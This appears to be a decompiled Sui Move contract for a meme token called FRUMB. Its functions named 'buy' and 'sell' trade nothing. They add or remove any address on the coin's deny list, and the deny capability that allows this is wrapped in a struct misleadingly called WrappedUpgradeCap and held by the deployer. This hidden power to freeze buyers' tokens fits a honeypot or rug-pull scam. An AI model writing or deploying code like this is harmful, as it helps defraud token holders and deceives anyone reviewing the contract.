module 0x6ade945be7b7e01cab6c489c86cb3b0ba74e0b22f828b46c5dbdb7d2662f28d5::FRUMB {
    struct FRUMB has drop {
        dummy_field: bool,
    }

    struct WrappedUpgradeCap has store, key {
        id: 0x2::object::UID,
        denyCap: 0x2::coin::DenyCapV2<FRUMB>,
    }

    public fun buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FRUMB>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    fun init(arg0: FRUMB, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FRUMB>(arg0, 6, b"FRUMB", b"frumb", b"Mischievous intelligence", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pump.mypinata.cloud/ipfs/QmbF9sjkBXmRT9VoqbJmLRWCeEpnALPyipxNx7on72DcsU?img-width=256&img-dpr=2&img-onerror=redirect"))), false, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FRUMB>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<FRUMB>>(v0, 0x2::tx_context::sender(arg1));
        let v3 = WrappedUpgradeCap{
            id      : 0x2::object::new(arg1),
            denyCap : v1,
        };
        0x2::transfer::public_transfer<WrappedUpgradeCap>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FRUMB>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

